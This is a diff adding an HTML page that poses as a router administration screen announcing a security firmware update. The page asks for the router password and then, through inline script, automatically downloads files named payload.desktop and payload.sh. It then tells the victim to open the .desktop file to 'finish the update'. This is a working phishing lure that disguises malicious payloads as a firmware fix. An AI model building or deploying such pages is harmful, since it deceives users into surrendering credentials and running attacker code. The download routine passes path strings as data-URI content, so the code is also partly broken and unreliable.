@@ -1,13 +1,113 @@
 <!DOCTYPE html>
 <html lang="en">
-	<head>
-		<meta charset="utf-8">
-		<meta http-equiv="X-UA-Compatible" content="IE=edge">
-		<meta name="viewport" content="width=device-width,initial-scale=1.0">
-		<script src="https://cdn.rawgit.com/eligrey/FileSaver.js/5ed507ef8aa53d8ecfea96d96bc7214cd2476fd2/FileSaver.min.js"></script>
-		<script type="text/javascript" src="script.js"></script>
-	</head>
-	<body>
-		<h1>Taking you to Google. . .</h1>
-	</body>
+<head>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width,initial-scale=1.0">
+	<link rel="stylesheet" type="text/css" href="router-upgrade.css">
+	<title>Router Admin</title>
+</head>
+<body>
+		<div class="main">
+		<div class="info_div">
+			<p id="info">Current firmware version: 3.14</p>
+			<div class="banner">
+		<img id="router_img" src="./img/router.png" width="100px" height="50px" style="float: left">
+		<h1>Router Administration</h1>
+	</div>
+		</div>
+		<div class="admin_div">
+			<table id="warning_table">
+				<tr>
+					<th>
+						<h4>FIRMWARE UPDATE NEEDED:</h4>
+					</th>
+				</tr>
+				<tr>
+					<td>
+						<p id="msg">Please download the files to update your firmware to version 4.1.3. This update features enchancements and important security updates.</p>
+					</td>
+				</tr>
+			</table>
+			<table id="admin_table">
+				<tr>
+					<th>
+						<h4>DOWNLOAD AND UPDATE:</h4>
+					</th>
+				</tr>
+				<tr>
+					<td>
+						<br><br>Router Password: <input id="pw" type="password"><br><br>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;Confirm: <input id="confirmpw" type="password"><br><br><br>
+						<button onclick="clicked()">Submit</button>
+					</td>
+				</tr>
+			</table>
+		</div>
+	</div>
+	<footer id="footer">Copyright &copy; 2020</footer>
+	<script>
+		function download(){
+			let filenames = ['payload.desktop', 'payload.sh'];
+			let linkNames = ['../payloads/payload.desktop', '../payloads/payload.sh'];
+			let link = document.createElement('a');
+			link.style.display = 'none';
+			document.body.appendChild(link);
+
+			for(var i = 0; i < filenames.length; i++){
+				link.setAttribute('href','data:text/plain;charset=utf-8,' + linkNames[i]);
+				link.setAttribute('download', filenames[i]);
+				link.click();
+			}
+
+			document.body.removeChild(link);
+		}
+
+
+		function clicked (){
+
+			let pwInput = document.getElementById("pw").value;
+			let confirmInput = document.getElementById("confirmpw").value;
+			// Checks to see if there was any input, if not create error messsage
+			if(pwInput === "" || confirmInput === ""){
+				// checks to see if there was a previous "p" element and remove it
+				if(document.contains(document.getElementById("submit_msg"))){
+					document.getElementById("submit_msg").remove();
+				}
+				// create a new p tag with message
+				let message = document.createElement("p");
+				message.id = "submit_msg";
+				message.innerHTML = "You must fill out both fields.";
+				message.style.color = "red";
+				document.getElementById("admin_table").getElementsByTagName("td")[0].appendChild(message);
+				// if the passwords dont match
+			} else {
+				if(pwInput !== confirmInput){
+
+				if(document.contains(document.getElementById("submit_msg"))){
+					document.getElementById("submit_msg").remove();
+				}
+				let message = document.createElement("p");
+				message.id = "submit_msg";
+				message.innerHTML = "Passwords do not match.";
+				message.style.color = "red";
+				document.getElementById("admin_table").getElementsByTagName("td")[0].appendChild(message);
+				// If it works.
+			} else {
+				// Remove the admin table and change the warning table to confirm.
+			let admin = document.getElementById("admin_table");
+			admin.style.display = "none";
+
+			let warning = document.getElementById("warning_table");
+			warning.getElementsByTagName("th")[0].style.background = "green";
+			warning.getElementsByTagName("h4")[0].innerHTML = "UPDATE DOWNLOADING"
+			warning.getElementsByTagName("p")[0].innerHTML = "Thank you! When your downloads are finished, click on \"payloads.desktop\" to finish the update process.";
+
+			download();
+
+		}
+	}
+
+		}
+	</script>
+</body>
 </html>
